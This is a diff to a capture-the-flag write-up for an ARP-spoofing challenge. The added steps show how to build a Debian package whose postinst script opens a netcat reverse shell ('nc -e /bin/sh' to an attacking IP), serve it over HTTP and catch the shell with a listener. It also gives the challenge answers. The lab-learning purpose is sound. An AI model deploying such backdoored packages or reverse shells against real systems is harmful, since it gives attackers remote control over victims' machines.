@@ -337,6 +337,9 @@ Answer: "JackFrostWasHere"
 
 Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document?
 
+![](screenshots/objective-9-completed.jpg)
+
+
 ~~~
 Jack Frost has hijacked the host at 10.6.6.35 with some custom malware.
 Help the North Pole by getting command line access back to this host.
@@ -447,8 +450,49 @@ https://www.cloudshark.org/captures/0320b9b57d35
 	- "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"
 
 - Step 9: Create that file and make it call back to listener on local machine.
+- Step 10: Determine payload to use. Simple nc reverse shell should work.
+~~~
 
+nc -e /bin/sh ATTACKING-IP 4444
 
+~~~
+- Step 11: Build the deb package with the above payload in the "postinst"
+	- "dpkg -x [debfile] work"
+	- "mkdir work/DEBIAN"
+ 	- "cd DEBIAN"
+	- "vim control"
+~~~
+
+Package: [Package Name]
+Version: [Package Version]
+Section: Network Tools
+Priority: optional
+Architecture: amd64
+Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
+Description: Network utility for hacking all the things.
+
+~~~
+	- "vim postinst"
+~~~
+
+#!/bin/sh
+
+nc -e /bin/sh [attacking ip] 4444
+~~~
+
+	- "chmod 755 postinst"
+	- "dpkg-deb --build /home/guest/debs/work"
+	- "mv work.deb [package name].deb"
+	- "python3 -m http.server 80"
+
+- Step 11: Start listener with "nc -nvlp 4444" 
+
+- Step 12: Get ARP and DNS responses going
+
+- Step 13: Navigate to file contents in question:
+	- "cat *.txt | grep recused"
+
+Answer: "Tanta Kringle"
 
 
 ---
